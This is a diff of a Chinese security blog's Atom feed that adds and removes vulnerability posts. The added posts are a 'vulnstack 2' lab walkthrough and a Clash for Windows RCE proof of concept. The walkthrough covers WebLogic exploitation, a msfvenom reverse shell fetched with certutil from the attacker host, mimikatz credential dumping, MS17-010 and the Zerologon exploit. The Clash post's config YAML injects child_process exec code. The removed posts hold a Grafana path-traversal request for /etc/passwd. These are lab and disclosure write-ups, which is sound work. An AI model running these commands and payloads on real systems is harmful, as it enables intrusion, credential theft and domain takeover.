@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://V-alkoinen.github.io</id>
     <title>老白</title>
-    <updated>2022-02-22T10:43:37.442Z</updated>
+    <updated>2022-03-03T11:06:27.789Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://V-alkoinen.github.io"/>
     <link rel="self" href="https://V-alkoinen.github.io/atom.xml"/>
@@ -10,7 +10,176 @@
     <icon>https://V-alkoinen.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, 老白</rights>
     <entry>
-        <title type="html"><![CDATA[向日葵RCE]]></title>
+        <title type="html"><![CDATA[vulnstack 2]]></title>
+        <id>https://V-alkoinen.github.io/post/vulnstack-2/</id>
+        <link href="https://V-alkoinen.github.io/post/vulnstack-2/">
+        </link>
+        <updated>2022-02-26T11:01:58.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="环境">环境</h1>
+<p>web：172.16.70.142  10.10.10.80<br>
+pc：   172.16.70.143  10.10.10.201<br>
+dc：   10.10.10.10</p>
+<h1 id="过程">过程：</h1>
+<p> <code>nmap -T4 -Pn -sV -O 172.16.70.142</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646132714799.png" alt="" loading="lazy"><br>
+ 发现142起了个weblogic，github上找个工具扫一下，查看是否有漏洞</p>
+<pre><code>git clone https://github.com/rabbitmask/WeblogicScan
+pip3 install -r requirements.txt
+python3 WeblogicScan.py -u 172.16.70.142 -p 7001
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646132789871.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646132843309.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646132868347.png" alt="" loading="lazy"><br>
+ 发现版本为10.3.6.0</p>
+<pre><code>msfconsole
+search weblogic 10.3.6
+use 1
+set rhosts 172.16.70.142
+set lport 9999 
+run
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646133015955.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133021973.png" alt="" loading="lazy"><br>
+ 142 getshell，搞个meterperter【<a href="https://qftm.github.io/2019/08/03/Windows-Reverse-Shell/">参考</a>】<br>
+ <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.70.129 LPORT=9998 -f exe &gt; ./shell.exe</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133152664.png" alt="" loading="lazy"><br>
+ <code>certutil.exe -urlcache -split -f http://192.16.70.129/shell.exe shell.exe</code>【<a href="https://www.cnblogs.com/lfoder/p/8241548.html">参考</a>】<br>
+<img src="https://V-alkoinen.github.io/post-images/1646133259291.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133265525.png" alt="" loading="lazy"></p>
+<pre><code>msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 9998
+run
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646133296178.png" alt="" loading="lazy"><br>
+ <code>./shell.exe</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133377638.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133383888.png" alt="" loading="lazy"><br>
+ <code>Getsystem</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133432888.png" alt="" loading="lazy"></p>
+<pre><code>chcp 65001
+whoami
+ipconfig
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646133462022.png" alt="" loading="lazy"><br>
+ 机器内部有两张网卡，一张是172.16.70.142 另一张是10.10.10.80，收集一波信息</p>
+<pre><code>nltest /dclist:
+net group “domain controllers” /doman
+net user /domain
+net group &quot;domain computers&quot; /domain
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646133568830.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133575140.png" alt="" loading="lazy"><br>
+ 搞个<code>mimikatz</code><br>
+ <code>git clone https://github.com/gentilkiwi/mimikatz</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133640390.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133646811.png" alt="" loading="lazy"><br>
+ <code>certutil.exe -urlcache -split -f http://172.16.70.129/mimikatz.exe mimi.exe</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133683731.png" alt="" loading="lazy"></p>
+<pre><code>cd C:\Oracle\Middleware\user_projects\domains\base_domain
+Mimi.exe
+privilege::debug
+log
+sekurlsa::logonpasswords
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646133820260.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133828228.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133834664.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133841082.png" alt="" loading="lazy"><br>
+ <code>此处说一下，我抓hash没发现域管的hash，但看了下网上的writeup都能抓到，我也不知道怎么抓的</code><br>
+ <a href="https://www.objectif-securite.ch/en/ophcrack">爆破hash</a><br>
+ 加路由</p>
+<pre><code>bg
+use post/multi/manage/autoroute
+set sission 1
+run
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1646134060731.png" alt="" loading="lazy"></figure>
+<pre><code>search ms17
+use 1
+set rhosts 10.10.10.10
+set lhost 10.10.10.80
+set lport 10001
+run
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646134099583.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646134106311.png" alt="" loading="lazy"><br>
+ 迁移进程拿shell</p>
+<pre><code>Ps
+migrate 328
+shell
+chcp 65001
+whoami
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646134229400.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646134235562.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646134241846.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646134566286.png" alt="" loading="lazy"></p>
+<h1 id="试用下cve-2020-1472">试用下CVE-2020-1472</h1>
+<p> 可利用该漏洞将域控的计算机的机器账号密码置为控，此处指的是 dc$<br>
+ <a href="https://github.com/dirkjanm/CVE-2020-1472">CVE-2020-1472</a><br>
+ 先搞个socks（之前已经添加过route了）</p>
+<pre><code>search socks
+use 0
+run
+vim /etc/proxychains4.conf
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1646139686405.png" alt="" loading="lazy"></figure>
+<pre><code>curl https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/cve-2020-1472-exploit.py &gt; 1.py
+python3 -m pip install impacket
+proxychains -q python3 1.py DC 10.10.10.10
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646139693934.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646139699034.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646139703868.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[clash RCE]]></title>
+        <id>https://V-alkoinen.github.io/post/clash-rce/</id>
+        <link href="https://V-alkoinen.github.io/post/clash-rce/">
+        </link>
+        <updated>2022-02-26T10:55:58.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="clash">CLASH</h1>
+<p>  A Windows/macOS/Linux GUI based on Clash and Electron.</p>
+<h1 id="rce">RCE</h1>
+<p>  <a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/2710">参考链接</a></p>
+<h1 id="漏洞复现">漏洞复现</h1>
+<pre><code>port: 7890
+socks-port: 7891
+allow-lan: true
+mode: Rule
+log-level: info
+external-controller: :9090
+proxies:
+  - name: a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;
+    type: socks5
+    server: 127.0.0.1
+    port: &quot;17938&quot;
+    skip-cert-verify: true
+  - name: abc
+    type: socks5
+    server: 127.0.0.1
+    port: &quot;8088&quot;
+    skip-cert-verify: true
+
+proxy-groups:
+  -
+    name: &lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;
+    type: select
+    proxies:
+    - a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646132381999.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646132387621.png" alt="" loading="lazy"></p>
+<h1 id="解决方案">解决方案</h1>
+<p>  升级至 <code>v 0.19.10</code></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[sunlogin RCE]]></title>
         <id>https://V-alkoinen.github.io/post/sunlogin-rce/</id>
         <link href="https://V-alkoinen.github.io/post/sunlogin-rce/">
         </link>
@@ -476,126 +645,6 @@ mimikatz &quot;kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;SID&gt; /kr
 <p> 权限维持完成</p>
 <h1 id="六-其他">六、其他</h1>
 <p> Kerberos协议详解：<a href="http://www.nosqlnotes.com/technotes/kerberos-protocol/">http://www.nosqlnotes.com/technotes/kerberos-protocol/</a></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CVE-2021-43798 Grafana未授权任意文件读取漏洞]]></title>
-        <id>https://V-alkoinen.github.io/post/grafana-Unauthorized-reading-of-arbitrary-files/</id>
-        <link href="https://V-alkoinen.github.io/post/grafana-Unauthorized-reading-of-arbitrary-files/">
-        </link>
-        <updated>2021-12-09T03:20:11.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="一-背景">一、背景</h1>
-<p><a href="https://twitter.com/jas502n/status/1468116658531487747?cxt=HHwWhsDSidKU5t8oAAAA">Grafana未授权任意文件读取漏洞</a><br>
-<img src="https://V-alkoinen.github.io/post-images/1644730783714.png" alt="" loading="lazy"></p>
-<h1 id="二-影响范围">二、影响范围</h1>
-<p>  <code>grafana 8.x</code></p>
-<h1 id="三-漏洞复现">三、漏洞复现</h1>
-<pre><code>docker run --name=grafana -d -p 80:3000 grafana/grafana:8.0.1
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644659742530.png" alt="" loading="lazy"></figure>
-<pre><code>GET /public/plugins/cloudwatch/../../../../../../../../../../../../etc/passwd HTTP/1.1
-Host: &lt;host&gt;
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
-Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8n
-Cookie: redirect_to=%2F
-Connection: close
-</code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1644659986203.png" alt="" loading="lazy"><br>
-  通过<code>/api/plugins</code>接口查看所有插件</p>
-<pre><code>GET /api/plugins HTTP/1.1
-Host: &lt;host&gt;
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
-Accept: */*
-Cookie: grafana_session=ab39f8213543745da2f725f26b026f49
-Connection: close
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1644660118608.png" alt="" loading="lazy"></figure>
-<pre><code>#默认插件
-alertmanager
-cloud-monitoring
-cloudwatch
-dashboard
-elasticsearch
-grafana
-grafana-azure-monitor-datasource
-graphite
-influxdb
-jaeger
-loki
-mixed
-mssql
-mysql
-opentsdb
-postgres
-prometheus
-tempo
-testdata
-zipkin
-alertGroups
-alertlist
-annolist
-barchart
-bargauge
-candlestick
-canvas
-dashlist
-debug
-gauge
-geomap
-gettingstarted
-graph
-heatmap
-histogram
-icon
-live
-logs
-news
-nodeGraph
-piechart
-pluginlist
-stat
-state-timeline
-status-history
-table
-table-old
-text
-timeseries
-welcome
-xychart
-</code></pre>
-<h1 id="四-漏洞修复">四、漏洞修复</h1>
-<p>  升级<code>grafana</code>至最新版本后(Grafana v8.3.5)，无该问题。<br>
-<img src="https://V-alkoinen.github.io/post-images/1644660299071.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1644660362241.png" alt="" loading="lazy"></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[ CVE-2020-27986 SonarQube未授权访问]]></title>
-        <id>https://V-alkoinen.github.io/post/ CVE-2020-27986-SonarQube-unauthorized/</id>
-        <link href="https://V-alkoinen.github.io/post/ CVE-2020-27986-SonarQube-unauthorized/">
-        </link>
-        <updated>2021-11-12T07:46:41.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="一-背景">一、背景</h1>
-<p>  近期，境外网站又报道了一些涉及中国多个机构和企业的代码泄漏，就是利用<code>SonarQube</code>的API未授权漏洞进行的。<br>
-<img src="https://V-alkoinen.github.io/post-images/1644306782124.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1644306879690.png" alt="" loading="lazy"></p>
-<h1 id="二-搭建sonarqube">二、搭建SonarQube</h1>
-<p>  参考<a href="https://v-alkoinen.github.io/post/sonarqube-da-jian/">https://v-alkoinen.github.io/post/sonarqube-da-jian/</a></p>
-<h1 id="三-漏洞复现">三、漏洞复现</h1>
-<p>  1、配置SVN<br>
-<img src="https://V-alkoinen.github.io/post-images/1644308908733.png" alt="" loading="lazy"><br>
-  2、配置Gitlab<br>
-<img src="https://V-alkoinen.github.io/post-images/1644309022235.png" alt="" loading="lazy"><br>
-  3、配置SMTP<br>
-<img src="https://V-alkoinen.github.io/post-images/1644309248467.png" alt="" loading="lazy"><br>
-  4、请求/api/settings/values接口<br>
-<img src="https://V-alkoinen.github.io/post-images/1644309332550.png" alt="" loading="lazy"><br>
-  5、此外/api/webservices/list接口也会泄露部分信息<br>
-<img src="https://V-alkoinen.github.io/post-images/1644309409453.png" alt="" loading="lazy"></p>
-<h1 id="四-修复建议">四、修复建议</h1>
-<p>  升级至安全版本<br>
-  为了预防供应链攻击，建议屏蔽所有第三方插件<br>
-<img src="https://V-alkoinen.github.io/post-images/1644309752807.png" alt="" loading="lazy"></p>
 ]]></content>
     </entry>
 </feed>
